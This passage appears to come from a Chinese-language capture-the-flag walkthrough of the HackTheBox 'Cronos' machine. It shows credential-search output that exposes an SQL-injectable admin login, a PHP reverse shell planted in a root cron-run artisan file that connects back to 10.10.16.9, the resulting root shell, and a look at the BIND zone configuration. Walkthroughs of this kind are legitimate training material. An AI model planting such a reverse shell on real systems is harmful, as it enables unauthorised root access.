/var/www/laravel/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php:        return $username !== null ? $username : 'anonymous';
/var/www/laravel/vendor/league/flysystem/src/Adapter/Ftp.php:                ) . ', username: ' . $this->getUsername()
/var/www/laravel/vendor/monolog/monolog/doc/01-usage.md:$logger->addInfo('Adding a new user', array('username' => 'Seldaek'));
/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/CouchDBHandler.php:            'username' => null,
/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php:            $dataArray['username'] = $this->username;
/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php:        $this->username = $username;
/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/Slack/SlackRecordTest.php:        $username = 'Monolog bot';
/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/SlackHandlerTest.php:        $this->assertRegExp('/username=Monolog/', $content);
/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/SlackWebhookHandlerTest.php:            'username' => 'test-username',
/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php:            'getUsername' => array(
/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php:            'getUsername' => array($methodProphecy)
/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php:            'isUsername' => array(
/var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst:            '{username}'=>$row['username'],                                                         
/var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst:            '{username}'=>$user['username'],                                                        
/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Plugins/PopBeforeSmtpPlugin.php:        $this->_username = $username;
/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/Esmtp/AuthHandler.php:        $this->_username = $username;
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = "DOMAIN\user";
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = "domain.com\user";
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'test';
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'user';
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'user@DOMAIN';
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'user@domain.com';
/var/www/laravel/vendor/symfony/http-foundation/Session/Storage/Handler/PdoSessionHandler.php:    private $username = '';
/var/www/laravel/vendor/symfony/http-foundation/Tests/RequestTest.php:        $request = Request::create('http://username:password@test.com');
/var/www/laravel/vendor/symfony/http-foundation/Tests/ServerBagTest.php:            'AUTHORIZATION' => 'Basic '.base64_encode('username:pass:word'),
/var/www/admin/index.php:                  <label>UserName  :</label><input type = "text" name = "username" class = "box"/><br /><br />
/var/www/admin/index.php:      $myusername = $_POST['username'];
/var/www/admin/index.php:      $sql = "SELECT id FROM users WHERE username = '".$myusername."' and password = '".$mypassword."'";
/var/www/admin/session.php:   $ses_sql = mysqli_query($db,"select username from admin where username = '$user_check' ");
/var/www/laravel/.env:DB_USERNAME=homestead
/var/www/laravel/.env:MAIL_USERNAME=null
/var/www/laravel/config/database.php:            'username' => env('DB_USERNAME', 'forge'),
/var/www/laravel/config/mail.php:    'username' => env('MAIL_USERNAME'),
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        $username = static::bothify($this->generator->parse($format));                     
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/fa_IR/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ja_JP/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ko_KR/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/lt_LT/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/zh_CN/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/test/Faker/Provider/InternetTest.php:        $username = $this->faker->username();
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Cache/MemcachedConnector.php:        list($username, $password) = $credentials;
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php:        list($username, $password) = [
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/README.md:    'username'  => 'root',                                                              
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Auth/ThrottlesLogins.php:        $errors = [$this->username() => $message];
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php:        $this->username = $username;
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php:    public function from($username, $icon = null)
/var/www/laravel/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php:        $username = $this->safeStorage->retrieveSafely('username');
/var/www/laravel/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php:        return $username !== null ? $username : 'anonymous';
/var/www/laravel/vendor/league/flysystem/src/Adapter/Ftp.php:                ) . ', username: ' . $this->getUsername()
/var/www/laravel/vendor/monolog/monolog/doc/01-usage.md:$logger->addInfo('Adding a new user', array('username' => 'Seldaek'));
/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/CouchDBHandler.php:            'username' => null,
/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php:            $dataArray['username'] = $this->username;
/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php:        $this->username = $username;
/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/Slack/SlackRecordTest.php:        $username = 'Monolog bot';
/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/SlackHandlerTest.php:        $this->assertRegExp('/username=Monolog/', $content);
/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/SlackWebhookHandlerTest.php:            'username' => 'test-username',
/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php:            'getUsername' => array(
/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php:            'getUsername' => array($methodProphecy)
/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php:            'isUsername' => array(
/var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst:            '{username}'=>$row['username'],                                                         
/var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst:            '{username}'=>$user['username'],                                                        
/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Plugins/PopBeforeSmtpPlugin.php:        $this->_username = $username;
/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/Esmtp/AuthHandler.php:        $this->_username = $username;
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = "DOMAIN\user";
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = "domain.com\user";
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'test';
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'user';
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'user@DOMAIN';
/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'user@domain.com';
/var/www/laravel/vendor/symfony/http-foundation/Session/Storage/Handler/PdoSessionHandler.php:    private $username = '';
/var/www/laravel/vendor/symfony/http-foundation/Tests/RequestTest.php:        $request = Request::create('http://username:password@test.com');
/var/www/laravel/vendor/symfony/http-foundation/Tests/ServerBagTest.php:            'AUTHORIZATION' => 'Basic '.base64_encode('username:pass:word'),

[+] Searching specific hashes inside files - less false positives (limit 70)
/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/RavenHandlerTest.php:43f6017361224d098402974103bfc53d:a6a0538fc2934ba2bed32e08741b2cd3                
/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/RavenHandlerTest.php:43f6017361224d098402974103bfc53d:a6a0538fc2934ba2bed32e08741b2cd3  
```

看到有个

```
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

将反弹shell的php代码写入artisan

```
<?php
$sock = fsockopen("10.10.16.9", 5656);
$descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>

```

```
──(root㉿kali)-[~/桌面/vpn]
└─# nc -lvnp 5656
listening on [any] 5656 ...


connect to [10.10.16.9] from (UNKNOWN) [10.129.227.211] 43994
whoami
root
which python3
/usr/bin/python3
python -c 'import pty; pty.spawn ("/bin/bash")'
root@cronos:~# ls
ls
fix_dns.sh  root.txt
```

拿到flag先不急着跑，很好奇为什么10.10.10.13不是cronos.htb的域名，去看看apache的配置文件

```
systemctl status bind
cd /etc/bind
ls -la
root@cronos:/etc/bind# cat named.conf
cat named.conf
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
// structure of BIND configuration files in Debian, *BEFORE* you customize 
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

```

找到倒霉蛋文件了，位于/etc/bind/zones下

```
root@cronos:/etc/bind# cat named.conf
cat named.conf
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
// structure of BIND configuration files in Debian, *BEFORE* you customize 
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

```



```
root@cronos:/etc/bind# cat named.conf.local        
cat named.conf.local
//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";

zone "cronos.htb" {
    type master;
    file "/etc/bind/zones/db.ns1.cronos.htb"; # zone file path
    allow-transfer { any; };
};
zone "129.10.in-addr.arpa" {
    type master;
    file "/etc/bind/zones/db.10.129";
    allow-transfer { any; };
};

```

原来是左田，named.conf包含了named.conf.local，named.conf.local又包含了/etc/bind/zones/db.ns1.cronos.htb

```
root@cronos:/etc/bind/zones# cat db.10.129
cat db.10.129
$TTL    604800
@       IN      SOA     cronos.htb. ns1.cronos.htb. (
                              3         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
; name servers
      IN      NS      ns1.cronos.htb.

; PTR Records
211.227   IN      PTR     ns1.cronos.htb.    ; 10.10.10.13
root@cronos:/etc/bind/zones# cat db.ns1.cronos.htb
cat db.ns1.cronos.htb
$TTL    604800
@       IN      SOA     cronos.htb. admin.cronos.htb. (
                  3     ; Serial
             604800     ; Refresh
              86400     ; Retry
            2419200     ; Expire
             604800 )   ; Negative Cache TTL
;
; name servers - NS records
     IN      NS      ns1.cronos.htb.

; name servers - A records
ns1.cronos.htb.          IN      A       10.10.10.13

; 10.10.10.0/24 - A records
cronos.htb.        IN      A      10.10.10.13
www        IN      A      10.10.10.13
admin   IN      A       10.10.10.13
root@cronos:/etc/bind/zones# pwd
pwd
/etc/bind/zones
root@cronos:/etc/bind/zones# 
```


